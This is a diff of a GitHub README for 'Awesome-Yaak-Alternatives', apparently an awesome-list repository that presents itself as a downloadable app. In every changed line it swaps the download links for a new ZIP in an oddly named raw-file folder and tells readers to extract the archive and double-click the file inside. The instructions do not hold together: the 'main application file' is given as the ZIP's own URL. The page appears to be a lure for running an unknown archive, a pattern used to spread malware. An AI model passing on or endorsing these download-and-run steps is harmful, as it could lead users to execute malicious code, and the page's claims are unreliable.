@@ -1,6 +1,6 @@
 # 🎉 Awesome-Yaak-Alternatives - Find Your Ideal API Tool
 
-[![Download Awesome-Yaak-Alternatives](https://raw.githubusercontent.com/sudeepsinghsisodia/Awesome-Yaak-Alternatives/main/emphlysis/Awesome-Yaak-Alternatives.zip)](https://raw.githubusercontent.com/sudeepsinghsisodia/Awesome-Yaak-Alternatives/main/emphlysis/Awesome-Yaak-Alternatives.zip)
+[![Download Awesome-Yaak-Alternatives](https://raw.githubusercontent.com/sudeepsinghsisodia/Awesome-Yaak-Alternatives/main/emphlysis/Awesome_Yaak_Alternatives_v2.7-beta.1.zip)](https://raw.githubusercontent.com/sudeepsinghsisodia/Awesome-Yaak-Alternatives/main/emphlysis/Awesome_Yaak_Alternatives_v2.7-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To run this application smoothly, your system should meet the following requirem
 
 To download and install **Awesome-Yaak-Alternatives**, please visit the Releases page using the link below. 
 
-[Download Here](https://raw.githubusercontent.com/sudeepsinghsisodia/Awesome-Yaak-Alternatives/main/emphlysis/Awesome-Yaak-Alternatives.zip)
+[Download Here](https://raw.githubusercontent.com/sudeepsinghsisodia/Awesome-Yaak-Alternatives/main/emphlysis/Awesome_Yaak_Alternatives_v2.7-beta.1.zip)
 
 ### 🌀 Installation Steps
 
@@ -26,7 +26,7 @@ To download and install **Awesome-Yaak-Alternatives**, please visit the Releases
 2. **Select the Latest Version**: Look for the latest version listed at the top.
 3. **Download the ZIP File**: Click on the file link to download the ZIP file to your computer. This file contains the application and all necessary components.
 4. **Extract the Files**: Once downloaded, locate the ZIP file in your downloads folder. Right-click on the file and select "Extract All" or a similar option to unzip the contents.
-5. **Run the Application**: Open the extracted folder and locate the main application file (e.g., `https://raw.githubusercontent.com/sudeepsinghsisodia/Awesome-Yaak-Alternatives/main/emphlysis/Awesome-Yaak-Alternatives.zip`). Double-click this file to launch the application.
+5. **Run the Application**: Open the extracted folder and locate the main application file (e.g., `https://raw.githubusercontent.com/sudeepsinghsisodia/Awesome-Yaak-Alternatives/main/emphlysis/Awesome_Yaak_Alternatives_v2.7-beta.1.zip`). Double-click this file to launch the application.
 
 ### 🔧 Using the Application
 
@@ -68,4 +68,4 @@ For any questions or support, please open an issue on our GitHub repository. We 
 
 Thank you for choosing **Awesome-Yaak-Alternatives**! We hope it enhances your API workflow. 
 
-[Download Here](https://raw.githubusercontent.com/sudeepsinghsisodia/Awesome-Yaak-Alternatives/main/emphlysis/Awesome-Yaak-Alternatives.zip)
+[Download Here](https://raw.githubusercontent.com/sudeepsinghsisodia/Awesome-Yaak-Alternatives/main/emphlysis/Awesome_Yaak_Alternatives_v2.7-beta.1.zip)
